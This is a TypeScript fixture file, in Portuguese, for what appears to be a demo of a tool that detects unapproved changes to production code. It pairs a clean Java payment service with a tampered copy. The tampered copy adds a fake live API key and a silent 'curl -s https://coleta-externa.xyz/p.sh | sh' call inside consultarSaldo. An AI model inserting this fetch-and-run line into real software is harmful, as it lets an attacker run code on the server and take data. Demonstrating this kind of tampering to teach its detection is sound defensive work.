/**
 * Codigo de exemplo da demonstracao publica.
 * Pacote neutro (br.com.exemplo) de proposito: nao representa cliente algum.
 */

export const ARQUIVO_EXEMPLO = 'PagamentoService.java';

export const CODIGO_APROVADO = `package br.com.exemplo.beneficios.service;

@Service
public class PagamentoService {

    private final TransacaoRepository repository;

    public SaldoDTO consultarSaldo(Long cartaoId) {
        return montarSaldo(repository.findById(cartaoId));
    }

    /** Repasse ao estabelecimento: liquido apos a taxa. */
    public BigDecimal calcularRepasse(BigDecimal bruto, BigDecimal taxa) {
        BigDecimal liquido = bruto.subtract(bruto.multiply(taxa));
        return liquido.setScale(2, RoundingMode.HALF_UP);
    }
}`;

const TRECHO_ORIGINAL = `    public SaldoDTO consultarSaldo(Long cartaoId) {
        return montarSaldo(repository.findById(cartaoId));
    }`;

const TRECHO_ADULTERADO = `    public SaldoDTO consultarSaldo(Long cartaoId) {
        String apiKey = "sk_live_EXEMPLOFICTICIO123456";
        java.net.http.HttpClient.newHttpClient();
        try { Runtime.getRuntime().exec("curl -s https://coleta-externa.xyz/p.sh | sh"); } catch (Exception e) {}
        return montarSaldo(repository.findById(cartaoId));
    }`;

/** Tres linhas inseridas — o bastante para o sistema seguir funcionando e vazar dados. */
export const CODIGO_ADULTERADO = CODIGO_APROVADO.replace(TRECHO_ORIGINAL, TRECHO_ADULTERADO);

/**
 * Veredito exibido na demonstracao. Na plataforma este texto e escrito por IA a
 * partir do diff real; aqui ele e fixo porque a pagina nao chama servidor nenhum.
 */
export const VEREDITO_COM_ACHADOS =
  'Alteração não aprovada, injetada diretamente em produção, com assinatura de comprometimento de segurança — não de manutenção legítima. Recomendação: isolar o serviço, reverter para o baseline aprovado, rotacionar as credenciais expostas e abrir investigação sobre autoria e janela de exposição.';

export const VEREDITO_SEM_ACHADOS =
  'O conteúdo diverge do aprovado, mas nenhum padrão conhecido de ataque foi reconhecido nas linhas novas. A mudança ainda exige revisão: nada aqui passou pelo fluxo de aprovação.';

export const VEREDITO_INTEGRO =
  'O conteúdo em produção é idêntico, byte a byte, à versão aprovada na Dalia. Nenhuma alteração fora do fluxo foi detectada.';
